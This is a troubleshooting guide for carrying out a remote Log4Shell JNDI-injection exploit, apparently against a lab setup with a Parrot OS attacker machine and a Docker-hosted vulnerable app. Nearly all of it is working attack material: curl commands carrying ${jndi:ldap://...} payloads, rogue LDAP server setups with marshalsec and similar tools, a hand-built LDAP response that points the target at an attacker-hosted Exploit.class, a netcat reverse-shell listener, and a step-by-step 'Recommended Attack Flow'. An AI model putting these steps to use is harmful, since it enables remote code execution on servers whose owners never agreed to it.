# Network Troubleshooting for Remote Log4Shell Exploitation

## Common Issues and Solutions

### Issue 1: UnknownHostException - DNS Resolution Failure

**Error:**
```
javax.naming.CommunicationException: attacker.local:1389
[Root exception is java.net.UnknownHostException: attacker.local]
```

**Root Cause:** The vulnerable application cannot resolve the hostname `attacker.local`

**Solutions:**

1. **Use IP Address Instead of Hostname**
   ```bash
   # Replace hostname with IP
   curl -H "User-Agent: ${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081
   ```

2. **Add Hosts Entry to Vulnerable Machine**
   ```bash
   # On vulnerable machine
   echo "10.0.0.8 attacker.local" | sudo tee -a /etc/hosts

   # In Docker container
   docker exec -it log4shell-simple sh -c "echo '10.0.0.8 attacker.local' >> /etc/hosts"
   ```

3. **Use Docker Network DNS**
   ```bash
   # Use container hostname if on same Docker network
   curl -H "User-Agent: ${jndi:ldap://ldap-exploit-server:1389/Exploit}" http://log4shell-simple:8080
   ```

### Issue 2: Connection Refused on LDAP Port

**Error:**
```
Connection refused: connect
```

**Diagnostics:**
```bash
# Check if LDAP server is running
netstat -tlnp | grep 1389
ss -tlnp | grep 1389

# Test connectivity
nc -zv 10.0.0.8 1389
telnet 10.0.0.8 1389

# Check firewall
sudo iptables -L -n | grep 1389
sudo ufw status | grep 1389
```

**Solutions:**

1. **Start LDAP Server on Attacker Machine**
   ```bash
   # Quick Python LDAP server
   sudo python3 -c "
   import socket
   s = socket.socket()
   s.bind(('0.0.0.0', 1389))
   s.listen(5)
   print('LDAP server listening on :1389')
   while True:
       c, a = s.accept()
       print(f'Connection from {a}')
       c.close()
   "
   ```

2. **Open Firewall Ports**
   ```bash
   # UFW (Ubuntu/Debian)
   sudo ufw allow 1389/tcp
   sudo ufw allow 8888/tcp

   # iptables
   sudo iptables -A INPUT -p tcp --dport 1389 -j ACCEPT
   sudo iptables -A INPUT -p tcp --dport 8888 -j ACCEPT
   ```

3. **Use Docker Port Mapping**
   ```yaml
   # In docker-compose.yml
   ldap-exploit-server:
     ports:
       - "1389:1389"
       - "8888:8888"
   ```

### Issue 3: LDAP Server Not Responding Correctly

**Symptoms:**
- Connection established but no exploitation
- LDAP server receives connection but doesn't send proper response

**Diagnostics:**
```bash
# Monitor LDAP traffic
sudo tcpdump -i any -nn port 1389

# Test LDAP response
ldapsearch -x -H ldap://10.0.0.8:1389 -b "" -s base

# Check LDAP server logs
docker logs ldap-exploit-server
tail -f ldap_server.log
```

**Solutions:**

1. **Use Proven Exploitation Tools**
   ```bash
   # marshalsec
   java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://10.0.0.8:8888/#Exploit"

   # Rogue-JNDI
   java -jar RogueJndi.jar --command "calc" --hostname "10.0.0.8"

   # JNDI-Exploit-Kit
   java -jar JNDI-Exploit-Kit.jar -L 10.0.0.8:1389 -J 10.0.0.8:8888
   ```

2. **Fix LDAP Response Format**
   ```python
   # Proper LDAP response for JNDI
   def build_ldap_response(attacker_ip):
       # SearchResultEntry
       response = b'\x30\x49'  # Sequence
       response += b'\x02\x01\x02'  # Message ID
       response += b'\x64\x44'  # Application 4 (SearchResultEntry)
       response += b'\x04\x00'  # Object name (empty)
       response += b'\x30\x40'  # Attributes

       # javaCodeBase attribute
       response += b'\x30\x3e'
       response += b'\x04\x0b' + b'javaCodeBase'
       response += b'\x31\x2f'
       response += b'\x04\x2d' + f'http://{attacker_ip}:8888/'.encode()

       return response
   ```

### Issue 4: Java Class Not Loading

**Symptoms:**
- LDAP connection successful
- HTTP request received but class not executed

**Diagnostics:**
```bash
# Check HTTP server logs
docker logs ldap-exploit-server | grep 8888
tail -f http_server.log

# Verify class file
file Exploit.class
javap -verbose Exploit.class

# Test HTTP access
curl http://10.0.0.8:8888/Exploit.class -o test.class
```

**Solutions:**

1. **Compile with Correct Java Version**
   ```bash
   # Use Java 8 for compatibility
   javac -source 8 -target 8 Exploit.java

   # Verify class version (should be 52.0 for Java 8)
   javap -verbose Exploit.class | grep "major version"
   ```

2. **Serve Class File Correctly**
   ```python
   # Python HTTP server with correct headers
   from http.server import HTTPServer, SimpleHTTPRequestHandler

   class ExploitHandler(SimpleHTTPRequestHandler):
       def end_headers(self):
           self.send_header('Content-Type', 'application/java-vm')
           super().end_headers()
   ```

### Issue 5: Network Routing Issues

**Diagnostics:**
```bash
# Check routing table
ip route
route -n

# Test connectivity path
traceroute 10.0.0.13
mtr 10.0.0.13

# Check NAT/forwarding
sudo iptables -t nat -L -n
cat /proc/sys/net/ipv4/ip_forward
```

**Solutions:**

1. **Enable IP Forwarding**
   ```bash
   # Temporary
   sudo sysctl -w net.ipv4.ip_forward=1

   # Permanent
   echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
   sudo sysctl -p
   ```

2. **Fix Docker Network**
   ```bash
   # Recreate network
   docker network rm log4shell-net
   docker network create --subnet=172.18.0.0/16 log4shell-net

   # Restart containers
   docker-compose -f docker-compose-remote.yml down
   docker-compose -f docker-compose-remote.yml up -d
   ```

## Quick Diagnostic Script

```bash
#!/bin/bash
# Save as diagnose.sh

ATTACKER_IP="10.0.0.8"
TARGET_IP="10.0.0.13"
TARGET_PORT="8081"

echo "=== Log4Shell Remote Exploitation Diagnostics ==="
echo ""

# Check target reachability
echo "[1] Testing target reachability..."
if ping -c 1 $TARGET_IP > /dev/null 2>&1; then
    echo "  ✓ Target $TARGET_IP is reachable"
else
    echo "  ✗ Target $TARGET_IP is NOT reachable"
fi

# Check target port
echo "[2] Testing target port..."
if nc -zv $TARGET_IP $TARGET_PORT 2>&1 | grep -q succeeded; then
    echo "  ✓ Port $TARGET_PORT is open"
else
    echo "  ✗ Port $TARGET_PORT is NOT open"
fi

# Check LDAP port
echo "[3] Testing LDAP port..."
if nc -zv $ATTACKER_IP 1389 2>&1 | grep -q succeeded; then
    echo "  ✓ LDAP port 1389 is open"
else
    echo "  ✗ LDAP port 1389 is NOT open"
fi

# Check HTTP port
echo "[4] Testing HTTP port..."
if nc -zv $ATTACKER_IP 8888 2>&1 | grep -q succeeded; then
    echo "  ✓ HTTP port 8888 is open"
else
    echo "  ✗ HTTP port 8888 is NOT open"
fi

# Test vulnerability
echo "[5] Testing vulnerability..."
RESPONSE=$(curl -s -H "User-Agent: test_\${java:version}" http://$TARGET_IP:$TARGET_PORT 2>&1)
if echo "$RESPONSE" | grep -q "Java version"; then
    echo "  ✓ Target appears vulnerable (JNDI lookups enabled)"
else
    echo "  ? Unable to confirm vulnerability"
fi

# Check Docker status
echo "[6] Checking Docker containers..."
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}" | grep -E "log4shell|ldap-exploit|attacker"

echo ""
echo "=== Diagnostics Complete ==="
```

## Recommended Attack Flow

1. **Prepare Attacker Machine**
   ```bash
   cd ~/log4shell-remote
   ./setup-remote-exploit.sh
   ```

2. **Start Services**
   ```bash
   # Terminal 1: HTTP Server
   python3 -m http.server 8888

   # Terminal 2: LDAP Server
   sudo python3 ldap_server.py

   # Terminal 3: Listener
   nc -lvnp 4444
   ```

3. **Execute Attack**
   ```bash
   # Use IP addresses, not hostnames
   curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081
   ```

4. **Verify Success**
   ```bash
   # Check for callback
   # Check LDAP server output
   # Check HTTP server access log
   # Check target for payload execution
   ```

## Working Configuration

Based on your setup:
- **Attacker (Parrot OS)**: 10.0.0.8
- **Target VM (Docker Host)**: 10.0.0.13
- **Vulnerable App**: Port 8081
- **LDAP Server**: Port 1389
- **HTTP Server**: Port 8888

**Working Command:**
```bash
# From attacker machine (10.0.0.8)
curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081
```

**Note:** Always use IP addresses instead of hostnames for remote exploitation unless DNS is properly configured.